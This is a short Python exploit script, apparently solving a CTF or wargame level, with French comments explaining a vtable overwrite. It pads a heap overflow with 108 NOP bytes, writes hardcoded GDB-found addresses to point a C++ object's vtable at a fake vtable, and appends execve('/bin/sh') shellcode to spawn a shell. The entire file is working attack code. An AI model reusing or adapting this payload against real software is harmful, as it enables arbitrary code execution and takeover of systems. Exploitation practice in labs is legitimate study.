#!/usr/bin/env python
import sys

# Shellcode execve("/bin/sh") - 21 bytes
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68"
shellcode += "\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# PROBLEME: L'appel de fonction virtuelle fait un DOUBLE deferencement:
# 1. Lit la vtable -> trouve une adresse
# 2. Lit a cette adresse -> trouve l'adresse de la fonction
# 3. Saute a cette adresse
#
# SOLUTION: Creer une fausse vtable qui pointe vers le shellcode
# Structure:
# [padding] [adresse fake_vtable] [adresse shellcode] [shellcode]

# Adresses (trouvees avec GDB):
# Objet 1: 0x0804a008
# Objet 2: 0x0804a078 (vtable a ecraser)
# fake_vtable sera a: 0x0804a07c (juste apres la vtable ecrasee)
# shellcode sera a: 0x0804a080 (apres fake_vtable)

padding = "\x90" * 108

# On ecrase la vtable de obj2 pour pointer vers notre fake_vtable
fake_vtable_addr = "\x7c\xa0\x04\x08"  # 0x0804a07c

# Notre fake_vtable contient l'adresse du shellcode
shellcode_addr = "\x80\xa0\x04\x08"    # 0x0804a080

# Construction du payload
payload = padding + fake_vtable_addr + shellcode_addr + shellcode

sys.stdout.write(payload)
